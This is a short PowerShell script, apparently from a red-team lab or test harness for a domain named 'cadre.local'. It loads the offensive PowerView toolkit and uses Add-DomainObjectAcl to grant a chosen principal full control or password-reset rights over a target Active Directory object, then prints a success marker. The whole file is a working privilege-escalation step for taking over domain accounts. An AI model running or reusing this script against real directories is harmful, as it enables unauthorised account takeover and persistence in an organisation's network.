[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][string]$Marker,
    [Parameter(Mandatory = $true)][string]$Target,
    [string]$Principal = "hunter_dfir",
    [ValidateSet("All", "ResetPassword")][string]$Rights = "All",
    [string]$Server = "dc01.cadre.local"
)
$ErrorActionPreference = "Stop"
$pv = "C:\Tools\cadre-attack\PowerView.ps1"
if (-not (Test-Path -LiteralPath $pv)) { throw "PowerView.ps1 not found" }
. $pv
# This PowerView build takes -TargetIdentity (not -Identity) and sam without DOMAIN\.
Add-DomainObjectAcl -TargetIdentity $Target -PrincipalIdentity $Principal -Rights $Rights -Server $Server -Verbose
Write-Output ($Marker + "_OK: granted " + $Rights + " to " + $Principal + " on " + $Target)
